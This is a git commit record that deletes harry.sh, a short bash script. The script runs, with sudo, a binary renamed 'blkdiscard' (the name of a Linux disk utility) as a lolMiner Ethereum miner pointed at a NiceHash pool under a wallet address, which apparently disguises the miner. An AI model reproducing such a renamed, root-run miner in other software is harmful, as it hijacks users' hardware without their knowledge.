71b8e860370680bf37023204efbbf5abda08d3aa
Harryx77 <52307152+Harryx77@users.noreply.github.com>
2021-09-13 22:06:03 +0700

    Delete harry.sh

--- harry.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-cd "$(dirname "$0")"
-
-chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353 --user 3338H9P49zfgN9DKG42bhv3CTPHmLE1ZwW.Harry77
-pause
